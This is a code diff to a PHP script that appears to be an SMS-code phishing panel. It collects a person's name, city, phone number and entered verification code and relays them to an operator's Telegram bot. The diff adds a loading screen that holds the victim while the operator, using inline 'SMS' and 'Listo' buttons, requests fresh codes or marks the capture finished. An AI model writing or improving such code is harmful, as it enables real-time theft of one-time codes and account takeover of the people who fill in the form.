@@ -98,6 +98,8 @@ function enviarATelegram($botToken, $chatId, $texto, $replyMarkup = null) {
 $accion = $_POST['accion'] ?? null;
 $codigoIngresado = $_POST['codigo'] ?? null;
 $mostrarPantallaCarga = false;
+$endpointCarga = 'check_ready.php';
+$redirectUrl = 'procesar.php';
 
 // Si llegan datos del formulario inicial (nombre, ciudad, celular)
 if (isset($_POST['nombre'], $_POST['ciudad'], $_POST['celular']) && $accion === null && $codigoIngresado === null) {
@@ -157,8 +159,11 @@ if ($accion === 'confirmar' && $codigoIngresado !== null) {
            "Código ingresado: $codigoIngresado";
 
     if ($telefono !== null && $codigoGuardado !== null && $codigoIngresado === (string)$codigoGuardado) {
-        $estadoConfirmado = true;
-        $mensajeConfirmacion = 'Listo, tu solicitud ha sido confirmada.';
+        // Código correcto: pasamos a pantalla de carga esperando confirmación final desde Telegram
+        $estadoConfirmado = false;
+        $mostrarPantallaCarga = true;
+        $endpointCarga = 'check_done.php';
+        $redirectUrl = 'final.php';
         borrarCodigo($telefono);
         $log .= "\nResultado: CORRECTO";
     } else {
@@ -166,16 +171,22 @@ if ($accion === 'confirmar' && $codigoIngresado !== null) {
         $_SESSION['mensaje_error'] = $mensajeConfirmacion;
         // Volver a pantalla de carga hasta que el administrador pida un nuevo SMS
         $mostrarPantallaCarga = true;
+        $endpointCarga = 'check_ready.php';
+        $redirectUrl = 'procesar.php';
         $log .= "\nResultado: INCORRECTO";
     }
 
-    // En cada intento de código agregamos también un botón para pedir nuevo SMS
+    // En cada intento de código agregamos también botones para pedir nuevo SMS o marcar como listo
     $replyMarkupIntento = [
         'inline_keyboard' => [
             [
                 [
                     'text' => '📩🔄 SMS',
                     'callback_data' => 'PEDIR_SMS|' . $telefono,
+                ],
+                [
+                    'text' => '✅ Listo',
+                    'callback_data' => 'LISTO|' . $telefono,
                 ],
             ],
         ],
@@ -206,11 +217,11 @@ if ($accion === 'confirmar' && $codigoIngresado !== null) {
         <script>
           (function() {
             function revisarEstado() {
-              fetch('check_ready.php', {cache: 'no-store'})
+              fetch('<?php echo $endpointCarga; ?>', {cache: 'no-store'})
                 .then(function(r){ return r.json(); })
                 .then(function(data){
                   if (data && data.ready) {
-                    window.location.href = 'procesar.php';
+                    window.location.href = '<?php echo $redirectUrl; ?>';
                   }
                 })
                 .catch(function(e){ /* ignorar errores momentáneos */ });
